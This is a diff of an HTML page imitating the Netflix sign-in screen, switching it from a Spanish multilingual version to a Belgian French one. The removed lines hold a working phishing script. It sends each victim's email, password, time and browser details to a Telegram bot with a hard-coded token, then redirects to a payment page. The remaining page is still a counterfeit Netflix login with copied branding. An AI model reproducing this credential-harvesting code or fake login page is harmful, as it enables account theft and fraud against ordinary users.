@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">Netflix España - Ver series y películas en streaming</title>
+    <title>Netflix Belgique - Regardez des séries et films en streaming</title>
     <style>
         * {
             margin: 0;
@@ -18,7 +18,7 @@
 
         body {
             color: #fff;
-            background: #000 url('netflixbackground.jpg') no-repeat center center/cover;
+            background: #000 url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3bd6dc-5b8d-4634-8c3c-8d0b4d8c8b8a/be9c1e1b-6b0d-4b0d-9b0d-9b0d4b0d9b0d/BE-fr-20240610-popsignuptwoweeks-perspective_alpha_website_large.jpg') no-repeat center center/cover;
             display: flex;
             flex-direction: column;
             position: relative;
@@ -305,41 +305,38 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
         <select class="language-selector" id="languageSelector">
             <option value="fr">Français</option>
-            <option value="en">English</option>
-            <option value="es">Español</option>
+            <option value="nl">Nederlands</option>
             <option value="de">Deutsch</option>
-            <option value="ru">Русский</option>
-            <option value="pl">Polski</option>
         </select>
     </header>
 
     <main>
         <div class="login-container">
-            <h1 id="loginTitle">Iniciar sesión</h1>
+            <h1>S'identifier</h1>
             <form id="loginForm">
                 <div class="input-group">
                     <input type="email" id="email" name="email" placeholder=" " required>
-                    <label for="email" id="emailLabel">Correo electrónico o número de teléfono</label>
+                    <label for="email">E-mail ou numéro de téléphone</label>
                 </div>
                 <div class="input-group">
                     <input type="password" id="password" name="password" placeholder=" " required>
-                    <label for="password" id="passwordLabel">Contraseña</label>
+                    <label for="password">Mot de passe</label>
                 </div>
                 <button type="submit" class="login-button" id="submitBtn">
-                    <span id="loginButtonText">Iniciar sesión</span>
+                    <span>S'identifier</span>
                     <div class="spinner"></div>
                 </button>
                 <div class="options-container">
                     <div class="remember-me">
                         <input type="checkbox" id="remember" class="remember-checkbox">
-                        <label for="remember" id="rememberLabel">Recuérdame</label>
+                        <label for="remember">Se souvenir de moi</label>
                     </div>
-                    <a href="#" class="help-link" id="helpLink">¿Necesitas ayuda?</a>
+                    <a href="#" class="help-link">Besoin d'aide ?</a>
                 </div>
             </form>
             <div class="signup-text">
-                <span id="newUserText">¿Nuevo en Netflix?</span> 
-                <a href="#" class="signup-link" id="signupLink">Suscríbete ahora.</a>
+                <span>Nouveau sur Netflix ?</span> 
+                <a href="#" class="signup-link">Inscrivez-vous maintenant.</a>
             </div>
         </div>
     </main>
@@ -347,171 +344,24 @@
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-top">
-                <span id="questionsText">¿Preguntas? Llama al</span> 
-                <a href="tel:(+33) 0805-543-063" class="footer-link">(+33) 0805-543-063</a>
+                <span>Des questions ? Appelez le </span> 
+                <a href="tel:0800-38963" class="footer-link">0800-38963</a>
             </div>
             <div class="footer-links">
-                <a href="#" class="footer-link" id="faqLink">Preguntas frecuentes</a>
-                <a href="#" class="footer-link" id="helpCenterLink">Centro de ayuda</a>
-                <a href="#" class="footer-link" id="termsLink">Términos de uso</a>
-                <a href="#" class="footer-link" id="privacyLink">Privacidad</a>
-                <a href="#" class="footer-link" id="cookiesLink">Preferencias de cookies</a>
-                <a href="#" class="footer-link" id="legalLink">Avisos legales</a>
-                <a href="#" class="footer-link" id="adsLink">Opciones de anuncios</a>
+                <a href="#" class="footer-link">FAQ</a>
+                <a href="#" class="footer-link">Centre d'aide</a>
+                <a href="#" class="footer-link">Conditions d'utilisation</a>
+                <a href="#" class="footer-link">Confidentialité</a>
+                <a href="#" class="footer-link">Préférences de cookies</a>
+                <a href="#" class="footer-link">Mentions légales</a>
+                <a href="#" class="footer-link">Choix liés à la pub</a>
             </div>
-            <div id="countryText">Netflix España</div>
+            <div>Netflix Belgique</div>
         </div>
     </footer>
 
     <script>
-        // Traducciones multilingües completas
-        const translations = {
-            fr: {
-                pageTitle: "Netflix France - Regardez des séries et films en streaming",
-                loginTitle: "S'identifier",
-                emailLabel: "E-mail ou numéro de téléphone",
-                passwordLabel: "Mot de passe",
-                loginButtonText: "S'identifier",
-                rememberLabel: "Se souvenir de moi",
-                helpLink: "Besoin d'aide ?",
-                newUserText: "Nouveau sur Netflix ?",
-                signupLink: "Inscrivez-vous maintenant.",
-                questionsText: "Des questions ? Appelez le",
-                faqLink: "FAQ",
-                helpCenterLink: "Centre d'aide",
-                termsLink: "Conditions d'utilisation",
-                privacyLink: "Confidentialité",
-                cookiesLink: "Préférences de cookies",
-                legalLink: "Mentions légales",
-                adsLink: "Choix liés à la pub",
-                countryText: "Netflix France"
-            },
-            en: {
-                pageTitle: "Netflix - Watch TV Shows Online, Watch Movies Online",
-                loginTitle: "Sign In",
-                emailLabel: "Email or phone number",
-                passwordLabel: "Password",
-                loginButtonText: "Sign In",
-                rememberLabel: "Remember me",
-                helpLink: "Need help?",
-                newUserText: "New to Netflix?",
-                signupLink: "Sign up now.",
-                questionsText: "Questions? Call",
-                faqLink: "FAQ",
-                helpCenterLink: "Help Center",
-                termsLink: "Terms of Use",
-                privacyLink: "Privacy",
-                cookiesLink: "Cookie Preferences",
-                legalLink: "Legal Notices",
-                adsLink: "Ad Choices",
-                countryText: "Netflix United States"
-            },
-            es: {
-                pageTitle: "Netflix España - Ver series y películas en streaming",
-                loginTitle: "Iniciar sesión",
-                emailLabel: "Correo electrónico o número de teléfono",
-                passwordLabel: "Contraseña",
-                loginButtonText: "Iniciar sesión",
-                rememberLabel: "Recuérdame",
-                helpLink: "¿Necesitas ayuda?",
-                newUserText: "¿Nuevo en Netflix?",
-                signupLink: "Suscríbete ahora.",
-                questionsText: "¿Preguntas? Llama al",
-                faqLink: "Preguntas frecuentes",
-                helpCenterLink: "Centro de ayuda",
-                termsLink: "Términos de uso",
-                privacyLink: "Privacidad",
-                cookiesLink: "Preferencias de cookies",
-                legalLink: "Avisos legales",
-                adsLink: "Opciones de anuncios",
-                countryText: "Netflix España"
-            },
-            de: {
-                pageTitle: "Netflix Deutschland - Serien und Filme online ansehen",
-                loginTitle: "Anmelden",
-                emailLabel: "E-Mail oder Telefonnummer",
-                passwordLabel: "Passwort",
-                loginButtonText: "Anmelden",
-                rememberLabel: "Angemeldet bleiben",
-                helpLink: "Hilfe benötigt?",
-                newUserText: "Neu bei Netflix?",
-                signupLink: "Jetzt anmelden.",
-                questionsText: "Fragen? Ruf an",
-                faqLink: "FAQ",
-                helpCenterLink: "Hilfe-Center",
-                termsLink: "Nutzungsbedingungen",
-                privacyLink: "Datenschutz",
-                cookiesLink: "Cookie-Einstellungen",
-                legalLink: "Rechtliche Hinweise",
-                adsLink: "Werbepräferenzen",
-                countryText: "Netflix Deutschland"
-            },
-            ru: {
-                pageTitle: "Netflix Россия - Смотрите сериалы и фильмы онлайн",
-                loginTitle: "Войти",
-                emailLabel: "Электронная почта или номер телефона",
-                passwordLabel: "Пароль",
-                loginButtonText: "Войти",
-                rememberLabel: "Запомнить меня",
-                helpLink: "Нужна помощь?",
-                newUserText: "Впервые в Netflix?",
-                signupLink: "Зарегистрируйтесь сейчас.",
-                questionsText: "Есть вопросы? Звоните",
-                faqLink: "Частые вопросы",
-                helpCenterLink: "Центр поддержки",
-                termsLink: "Условия использования",
-                privacyLink: "Конфиденциальность",
-                cookiesLink: "Настройки файлов cookie",
-                legalLink: "Юридические уведомления",
-                adsLink: "Настройки рекламы",
-                countryText: "Netflix Россия"
-            },
-            pl: {
-                pageTitle: "Netflix Polska - Oglądaj seriale i filmy online",
-                loginTitle: "Zaloguj się",
-                emailLabel: "Adres e-mail или numer telefonu",
-                passwordLabel: "Hasło",
-                loginButtonText: "Zaloguj się",
-                rememberLabel: "Zapamiętaj mnie",
-                helpLink: "Potrzebujesz pomocy?",
-                newUserText: "Nowy w Netflix?",
-                signupLink: "Zarejestruj się teraz.",
-                questionsText: "Pytania? Zadzwoń pod numer",
-                faqLink: "FAQ",
-                helpCenterLink: "Centrum pomocy",
-                termsLink: "Warunki użytkowania",
-                privacyLink: "Prywatność",
-                cookiesLink: "Preferencje dotyczące plików cookie",
-                legalLink: "Informacje prawne",
-                adsLink: "Ustawienia reklam",
-                countryText: "Netflix Polska"
-            }
-        };
-
-        // Gestión del cambio de idioma
-        document.getElementById('languageSelector').addEventListener('change', function() {
-            const lang = this.value;
-            localStorage.setItem('netflixLang', lang);
-            updateLanguage(lang);
-        });
-
-        function updateLanguage(lang) {
-            const trans = translations[lang];
-            for (const [key, value] of Object.entries(trans)) {
-                const element = document.getElementById(key);
-                if (element) {
-                    element.textContent = value;
-                }
-            }
-            document.title = trans.pageTitle;
-        }
-
-        // Inicializar el idioma al cargar
-        const savedLang = localStorage.getItem('netflixLang') || 'es';
-        document.getElementById('languageSelector').value = savedLang;
-        updateLanguage(savedLang);
-
-        // Gestión del formulario
+        // Gestion du formulaire
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -519,66 +369,14 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            // Mostrar spinner
+            // Afficher le spinner
             submitBtn.classList.add('btn-loading');
             
-            // Enviar datos al bot de Telegram
-            const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
-            const chatId = '-4883048028';
-            const lang = document.getElementById('languageSelector').value;
-            const message = `🔐 ${lang === 'en' ? 'NEW NETFLIX LOGIN ATTEMPT' : 
-                           lang === 'es' ? 'NUEVO INTENTO DE INICIO DE SESIÓN EN NETFLIX' :
-                           lang === 'de' ? 'NEUE NETFLIX-ANMELDEVERSUCH' :
-                           lang === 'ru' ? 'НОВАЯ ПОПЫТКА ВХОДА В NETFLIX' :
-                           lang === 'pl' ? 'NOWA PRÓBA LOGOWANIA DO NETFLIX' : 'NOUVELLE TENTATIVE DE CONNEXION NETFLIX'} 🔐
-
-📧 ${lang === 'en' ? 'Email' : 
-    lang === 'es' ? 'Correo electrónico' : 
-    lang === 'de' ? 'E-Mail' : 
-    lang === 'ru' ? 'Электронная почта' : 
-    lang === 'pl' ? 'E-mail' : 'E-mail'}: ${email}
-🔑 ${lang === 'en' ? 'Password' : 
-    lang === 'es' ? 'Contraseña' : 
-    lang === 'de' ? 'Passwort' : 
-    lang === 'ru' ? 'Пароль' : 
-    lang === 'pl' ? 'Hasło' : 'Mot de passe'}: ${password}
-
-⏰ ${new Date().toLocaleString()}
-🌍 ${lang === 'en' ? 'Language' : 
-    lang === 'es' ? 'Idioma' : 
-    lang === 'de' ? 'Sprache' : 
-    lang === 'ru' ? 'Язык' : 
-    lang === 'pl' ? 'Język' : 'Langue'}: ${document.getElementById('languageSelector').value.toUpperCase()}
-📱 ${lang === 'en' ? 'Device' : 
-    lang === 'es' ? 'Dispositivo' : 
-    lang === 'de' ? 'Gerät' : 
-    lang === 'ru' ? 'Устройство' : 
-    lang === 'pl' ? 'Urządzenie' : 'Appareil'}: ${navigator.userAgent}`;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Credenciales enviadas a Telegram:', data);
-            })
-            .catch(error => {
-                console.error('Error al enviar a Telegram:', error);
-            })
-            .finally(() => {
-                // Esperar 2 segundos antes de redirigir (simulando inicio de sesión)
-                setTimeout(() => {
-                    const lang = document.getElementById('languageSelector').value;
-                    window.location.href = `paiement.html?lang=${lang}`;
-                }, 2000);
-            });
+            // Simuler le traitement de connexion
+            setTimeout(() => {
+                // Redirection vers la page d'accueil après connexion
+                window.location.href = "https://www.netflix.com/be-fr/";
+            }, 2000);
         });
     </script>
 </body>
